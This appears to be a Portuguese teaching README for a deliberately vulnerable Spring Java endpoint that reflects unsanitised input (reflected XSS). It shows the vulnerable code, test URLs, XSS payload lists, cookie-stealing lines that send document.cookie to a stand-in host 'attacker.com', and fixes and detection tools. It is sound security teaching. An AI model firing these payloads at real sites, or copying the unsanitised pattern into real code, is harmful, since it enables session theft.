# Vulnerabilidade XSS Refletido - Fins Didáticos

## ⚠️ AVISO IMPORTANTE
Esta vulnerabilidade foi implementada **APENAS PARA FINS DIDÁTICOS** e **NÃO DEVE SER USADA EM AMBIENTES DE PRODUÇÃO**.

## Vulnerabilidade Implementada

### Endpoint Vulnerável
**GET** `/api/processos/numero/{numeroProcesso}`

### Descrição da Vulnerabilidade
O endpoint que consulta processos por número é vulnerável a **XSS Refletido** porque:

1. **Retorna input do usuário sem sanitização**: O parâmetro `numeroProcesso` é retornado diretamente na resposta JSON
2. **Mensagem de erro vulnerável**: Quando o processo não é encontrado, o número é incluído na mensagem de erro sem sanitização

### Código Vulnerável
```java
@GetMapping("/numero/{numeroProcesso}")
public ResponseEntity<Object> findByNumeroProcesso(@PathVariable String numeroProcesso) {
    // VULNERABILIDADE XSS REFLETIDO - O número do processo é retornado sem sanitização
    response.put("numeroProcesso", numeroProcesso); // VULNERÁVEL: retorna o input do usuário sem sanitizar
    
    // VULNERABILIDADE XSS REFLETIDO - Mensagem de erro também é vulnerável
    return ResponseEntity.status(HttpStatus.NOT_FOUND).body("Processo com número '" + numeroProcesso + "' não encontrado!");
}
```

## Como Testar a Vulnerabilidade

### 1. Teste Básico de XSS
**URL:** `GET http://localhost:8080/api/processos/numero/<script>alert('XSS')</script>`

**Resposta esperada:**
```json
{
    "error": "Processo com número '<script>alert('XSS')</script>' não encontrado!"
}
```

### 2. Teste com Payload JavaScript
**URL:** `GET http://localhost:8080/api/processos/numero/0001234-56.2023.8.26.0100<script>alert('XSS')</script>`

### 3. Teste com Payload Mais Complexo
**URL:** `GET http://localhost:8080/api/processos/numero/"><script>alert(document.cookie)</script>`

### 4. Teste com Payload de Roubo de Cookies
**URL:** `GET http://localhost:8080/api/processos/numero/"><script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>`

## Payloads de Teste

### Payloads Básicos:
```
<script>alert('XSS')</script>
<script>alert(1)</script>
<img src=x onerror=alert('XSS')>
```

### Payloads Avançados:
```
"><script>alert(document.cookie)</script>
javascript:alert('XSS')
<svg onload=alert('XSS')>
```

### Payloads de Roubo de Dados:
```
"><script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
"><script>new Image().src='http://attacker.com/steal?cookie='+document.cookie;</script>
```

## Como Explorar

### 1. Via Navegador
1. Acesse a URL com o payload XSS
2. Se a resposta for renderizada em HTML, o script será executado

### 2. Via Ferramentas de Teste
- **Burp Suite**: Intercepte a requisição e modifique o parâmetro
- **OWASP ZAP**: Use o scanner automático
- **Postman**: Envie requisições com payloads XSS

### 3. Via cURL
```bash
curl -X GET "http://localhost:8080/api/processos/numero/%3Cscript%3Ealert('XSS')%3C/script%3E"
```

## Impacto da Vulnerabilidade

### 1. Execução de JavaScript Malicioso
- Roubo de cookies de sessão
- Redirecionamento para sites maliciosos
- Coleta de dados sensíveis

### 2. Ataques de Sessão
- Hijacking de sessão
- Elevação de privilégios
- Acesso não autorizado

### 3. Defacement
- Modificação da aparência do site
- Inserção de conteúdo malicioso

## Como Corrigir

### 1. Sanitização de Input
```java
// CORREÇÃO: Sanitizar o input antes de retornar
String sanitizedNumero = HtmlUtils.htmlEscape(numeroProcesso);
response.put("numeroProcesso", sanitizedNumero);
```

### 2. Validação de Input
```java
// CORREÇÃO: Validar o formato do número do processo
if (!numeroProcesso.matches("^[0-9.-]+$")) {
    return ResponseEntity.status(HttpStatus.BAD_REQUEST).body("Número de processo inválido");
}
```

### 3. Headers de Segurança
```java
// CORREÇÃO: Adicionar headers de segurança
response.setHeader("X-XSS-Protection", "1; mode=block");
response.setHeader("Content-Security-Policy", "default-src 'self'");
```

### 4. Encoding Adequado
```java
// CORREÇÃO: Usar encoding adequado
response.setContentType("application/json; charset=UTF-8");
```

## Ferramentas de Detecção

### 1. Scanners Automáticos
- OWASP ZAP
- Burp Suite Professional
- Acunetix
- Netsparker

### 2. Testes Manuais
- Inspeção de código
- Testes de payload
- Análise de resposta

### 3. Headers de Segurança
- X-XSS-Protection
- Content-Security-Policy
- X-Content-Type-Options

## Boas Práticas

### 1. Sempre Sanitizar Input
- Use bibliotecas de sanitização
- Valide formato de entrada
- Escape caracteres especiais

### 2. Headers de Segurança
- Implemente CSP
- Configure XSS Protection
- Use HTTPS

### 3. Validação Rigorosa
- Valide formato de dados
- Rejeite input malicioso
- Use whitelist de caracteres

### 4. Monitoramento
- Logs de segurança
- Detecção de anomalias
- Alertas de tentativas de XSS

## Conclusão

Esta vulnerabilidade foi implementada **EXCLUSIVAMENTE PARA FINS DIDÁTICOS** para demonstrar:

1. Como vulnerabilidades XSS podem ser introduzidas
2. Como testar e detectar XSS
3. Como corrigir e prevenir XSS
4. Importância da sanitização de input

**NUNCA implemente vulnerabilidades em ambientes de produção!** 